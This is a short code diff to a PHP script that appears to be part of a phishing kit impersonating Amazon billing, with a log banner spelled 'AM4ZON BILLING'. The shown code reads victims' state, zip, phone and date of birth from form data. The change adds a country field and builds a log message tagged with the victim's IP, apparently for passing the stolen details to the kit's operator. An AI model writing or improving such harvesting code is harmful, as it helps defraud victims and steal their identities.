@@ -21,7 +21,10 @@ $state = $_POST['state'];
 $zip = $_POST['zip'];
 $phone = $_POST['phone'];
 $dob = $_POST['dob'];
-$country = $query['country'];
+$country = isset($_POST['country']) ? trim($_POST['country']) : '';
+if ($country === '' && isset($countryname)) {
+    $country = $countryname;
+}
 
 # Logs
 $message .= "🔥 AM4ZON BILLING FROM - {$IP} 🔥\n\n";
